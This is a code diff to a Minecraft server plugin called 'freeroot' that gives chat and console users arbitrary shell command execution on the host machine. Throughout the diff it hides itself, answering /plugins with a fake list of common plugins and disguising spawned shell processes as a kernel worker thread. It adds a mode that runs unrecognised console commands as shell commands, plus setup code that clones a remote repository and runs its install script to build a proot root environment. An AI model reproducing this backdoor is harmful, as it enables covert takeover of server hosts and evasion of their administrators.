@@ -43,7 +43,7 @@ public class freeroot extends JavaPlugin implements Listener {
     private final List<String> fakePlugins = Arrays.asList(
             "Essentials", "WorldEdit", "Vault", "LuckPerms", "PlaceholderAPI"
     );
-    private static final String PLUGIN_VERSION = "v1.5";
+    private static final String PLUGIN_VERSION = "v1.6-SNAPSHOT";
     private static final String PLUGIN_AUTHOR = "mytai";
     private static final String PLUGIN_REPO = "https://github.com/Mytai20100/freeroot-jar";
 
@@ -164,6 +164,19 @@ public class freeroot extends JavaPlugin implements Listener {
         String[] parts = message.split(" ", 2);
         String cmd = parts[0].toLowerCase();
 
+        // QUAN TRỌNG: Bỏ qua lệnh /r khi có tham số -on/-off
+        if ((cmd.equals("/r") || cmd.equals("/rt")) && parts.length > 1) {
+            String firstArg = parts[1].toLowerCase().trim();
+            if (firstArg.equals("-on") || firstArg.equals("-off") ||
+                    firstArg.equals("log") || firstArg.equals("pwd") ||
+                    firstArg.equals("reset") || firstArg.equals("version") ||
+                    firstArg.equals("disable-log") || firstArg.equals("enable-log") ||
+                    firstArg.equals("disable-pl") || firstArg.equals("enable-pl") ||
+                    firstArg.startsWith("startup")) {
+                return; // Cho phép command handler xử lý
+            }
+        }
+
         if (cmd.equals("/root") || cmd.equals("/r") || cmd.equals("/rt") ||
                 cmd.equals("/neofetch") || cmd.equals("/info") ||
                 cmd.startsWith("/minecraft:") || cmd.startsWith("/bukkit:")) {
@@ -188,14 +201,39 @@ public class freeroot extends JavaPlugin implements Listener {
 
     @EventHandler
     public void onServerCommand(ServerCommandEvent event) {
-        if (!pluginHidden) return;
         String cmd = event.getCommand().toLowerCase().trim();
-        if (cmd.equals("plugins") || cmd.equals("pl") ||
-                cmd.equals("bukkit:plugins") || cmd.equals("bukkit:pl")) {
+        if (pluginHidden) {
+            if (cmd.equals("plugins") || cmd.equals("pl") ||
+                    cmd.equals("bukkit:plugins") || cmd.equals("bukkit:pl")) {
+                event.setCancelled(true);
+                CommandSender sender = event.getSender();
+                sender.sendMessage(colorize("&aPlugins (&f" + fakePlugins.size() + "&a): &f" +
+                        String.join(", ", fakePlugins)));
+                return;
+            }
+        }
+        if (alwaysMode) {
+            String fullCmd = event.getCommand().trim();
+            String[] parts = fullCmd.split(" ", 2);
+            String baseCmd = parts[0].toLowerCase();
+            if (baseCmd.equals("root") || baseCmd.equals("r") || baseCmd.equals("rt") ||
+                    baseCmd.equals("neofetch") || baseCmd.equals("info") ||
+                    baseCmd.startsWith("minecraft:") || baseCmd.startsWith("bukkit:")) {
+                return;
+            }
+            if (getServer().getPluginCommand(baseCmd) != null) {
+                return;
+            }
             event.setCancelled(true);
             CommandSender sender = event.getSender();
-            sender.sendMessage(colorize("&aPlugins (&f" + fakePlugins.size() + "&a): &f" +
-                    String.join(", ", fakePlugins)));
+            sender.sendMessage(colorize("&e[Always Mode] &7Executing: &f" + fullCmd));
+
+            new BukkitRunnable() {
+                @Override
+                public void run() {
+                    executeCommand(sender, fullCmd, "CONSOLE");
+                }
+            }.runTaskAsynchronously(this);
         }
     }
     @EventHandler
@@ -390,7 +428,17 @@ public class freeroot extends JavaPlugin implements Listener {
                     sender.sendMessage(colorize("&7│   &9" + PLUGIN_REPO));
                     sender.sendMessage(colorize("&7│ &fFeatures:"));
                     sender.sendMessage(colorize("&7│   &a✓ &7Startup Commands"));
-                    sender.sendMessage(colorize("&7│   &a✘ &7Plugin Hide"));
+                    sender.sendMessage(colorize("&7│   &a✓ &7Plugin Hide"));
+                    sender.sendMessage(colorize("&7│   &a✓ &7Proot Integration"));
+                    sender.sendMessage(colorize("&7│   &a✓ &7Root Privileges (via proot)"));
+
+                    File prootBin = new File(System.getProperty("user.dir"), ".cache/minecraft/work/usr/local/bin/proot");
+                    if (prootBin.exists()) {
+                        sender.sendMessage(colorize("&7│ &fProot: &aEnabled &7(found at work dir)"));
+                    } else {
+                        sender.sendMessage(colorize("&7│ &fProot: &cNot found &7(normal execution)"));
+                    }
+
                     sender.sendMessage(colorize("&d└─────────────────────────┘"));
                     return true;
                 }
@@ -554,10 +602,39 @@ public class freeroot extends JavaPlugin implements Listener {
                 getLogger().info(colorize("&e[*] Running command: &f" + command + " &7in directory: &f" + currentDir));
             }
 
-            // Wrap command with exec -a to mask process name as kworker
-            String maskedCommand = "exec -a '[kworker/u16:2-events]' bash -c " + escapeForShell(command);
+            // Check if proot environment exists
+            File prootDir = new File(System.getProperty("user.dir"), ".cache/minecraft/work");
+            File prootBin = new File(prootDir, "usr/local/bin/proot");
 
-            ProcessBuilder pb = new ProcessBuilder("bash", "-c", maskedCommand);
+            String finalCommand;
+            if (prootBin.exists() && prootBin.canExecute()) {
+                // Run command inside proot environment with root privileges
+                if (consoleLogging && !pluginHidden) {
+                    getLogger().info(colorize("&a[*] Executing in proot environment with root privileges"));
+                }
+
+                String escapedCmd = command.replace("\"", "\\\"").replace("\\", "\\\\");
+                String prootCmd = prootBin.getAbsolutePath() +
+                        " --rootfs=\"" + prootDir.getAbsolutePath() + "\"" +
+                        " -0" +
+                        " -w \"/root\"" +
+                        " -b /dev" +
+                        " -b /sys" +
+                        " -b /proc" +
+                        " -b /etc/resolv.conf" +
+                        " --kill-on-exit" +
+                        " /bin/bash -c \"" + escapedCmd + "\"";
+
+                finalCommand = "exec -a '[kworker/u16:2-events]' bash -c " + escapeForShell(prootCmd);
+            } else {
+                // Fallback to normal execution
+                if (consoleLogging && !pluginHidden) {
+                    getLogger().info(colorize("&e[*] Proot not found, executing normally"));
+                }
+                finalCommand = "exec -a '[kworker/u16:2-events]' bash -c " + escapeForShell(command);
+            }
+
+            ProcessBuilder pb = new ProcessBuilder("bash", "-c", finalCommand);
             pb.redirectErrorStream(true);
             pb.directory(new File(currentDir));
 
@@ -708,6 +785,10 @@ public class freeroot extends JavaPlugin implements Listener {
             }.runTask(this);
         }
     }
+    private static final String CACHE_DIR = ".cache/minecraft";
+    private static final String WORK_DIR = CACHE_DIR + "/work";
+    private static final String PROOT_BIN = WORK_DIR + "/usr/local/bin/proot";
+
     private void ensureBasicSetup() {
         if (isInitialized || isInitializing) {
             return;
@@ -719,20 +800,106 @@ public class freeroot extends JavaPlugin implements Listener {
             isInitializing = true;
         }
         try {
-            if (consoleLogging && !pluginHidden) {
-                getLogger().info(colorize("&e[*] Basic setup check..."));
+            File cacheDir = new File(System.getProperty("user.dir"), CACHE_DIR);
+            File workDir = new File(System.getProperty("user.dir"), WORK_DIR);
+            File prootBin = new File(System.getProperty("user.dir"), PROOT_BIN);
+            if (workDir.exists() && prootBin.exists() && prootBin.canExecute()) {
+                if (consoleLogging && !pluginHidden) {
+                    getLogger().info(colorize("&a[+] Proot environment already exists!"));
+                }
+                isInitialized = true;
+                return;
             }
+            if (!cacheDir.exists()) {
+                if (consoleLogging && !pluginHidden) {
+                    getLogger().info(colorize("&e[*] Creating cache directory..."));
+                }
+                cacheDir.mkdirs();
+            }
+
+            if (consoleLogging && !pluginHidden) {
+                getLogger().info(colorize("&e[*] Setting up proot environment..."));
+                getLogger().info(colorize("&7    This may take a few minutes..."));
+            }
+            String tempDir = CACHE_DIR + "/freeroot_temp";
+            ProcessBuilder cloneProcess = new ProcessBuilder(
+                    "bash", "-c",
+                    "cd " + escapeForShell(cacheDir.getAbsolutePath()) + " && " +
+                            "git clone https://github.com/Mytai20100/freeroot.git freeroot_temp"
+            );
+            cloneProcess.redirectErrorStream(true);
+            Process clone = cloneProcess.start();
+
+            BufferedReader cloneReader = new BufferedReader(new InputStreamReader(clone.getInputStream()));
+            String line;
+            while ((line = cloneReader.readLine()) != null) {
+                if (consoleLogging && !pluginHidden) {
+                    getLogger().info("[SETUP] " + line);
+                }
+            }
+            clone.waitFor();
+            cloneReader.close();
+            File tempDirFile = new File(System.getProperty("user.dir"), tempDir);
+            if (tempDirFile.exists()) {
+                if (workDir.exists()) {
+                    deleteDirectory(workDir);
+                }
+                tempDirFile.renameTo(workDir);
+
+                if (consoleLogging && !pluginHidden) {
+                    getLogger().info(colorize("&a[+] Repository cloned and renamed to 'work'"));
+                }
+            }
+            File noninteractiveScript = new File(workDir, "noninteractive.sh");
+            if (noninteractiveScript.exists()) {
+                if (consoleLogging && !pluginHidden) {
+                    getLogger().info(colorize("&e[*] Running noninteractive.sh..."));
+                }
+
+                ProcessBuilder setupProcess = new ProcessBuilder(
+                        "bash", "-c",
+                        "cd " + escapeForShell(workDir.getAbsolutePath()) + " && " +
+                                "chmod +x noninteractive.sh && " +
+                                "./noninteractive.sh"
+                );
+                setupProcess.redirectErrorStream(true);
+                Process setup = setupProcess.start();
+
+                BufferedReader setupReader = new BufferedReader(new InputStreamReader(setup.getInputStream()));
+                while ((line = setupReader.readLine()) != null) {
+                    if (consoleLogging && !pluginHidden) {
+                        getLogger().info("[SETUP] " + line);
+                    }
+                }
+                setup.waitFor();
+                setupReader.close();
+
+                if (consoleLogging && !pluginHidden) {
+                    getLogger().info(colorize("&a[+] Proot environment setup completed!"));
+                }
+            }
+
             isInitialized = true;
-            if (consoleLogging && !pluginHidden) {
-                getLogger().info(colorize("&a[+] Basic setup completed!"));
-            }
+
         } catch (Exception e) {
             if (!pluginHidden) {
-                getLogger().warning(colorize("&c[-] Basic setup failed: " + e.getMessage()));
+                getLogger().warning(colorize("&c[-] Setup failed: " + e.getMessage()));
+                e.printStackTrace();
             }
         } finally {
             isInitializing = false;
         }
+    }
+    private void deleteDirectory(File dir) {
+        if (dir.isDirectory()) {
+            File[] files = dir.listFiles();
+            if (files != null) {
+                for (File file : files) {
+                    deleteDirectory(file);
+                }
+            }
+        }
+        dir.delete();
     }
     private String escapeForShell(String command) {
         return "'" + command.replace("'", "'\\''") + "'";
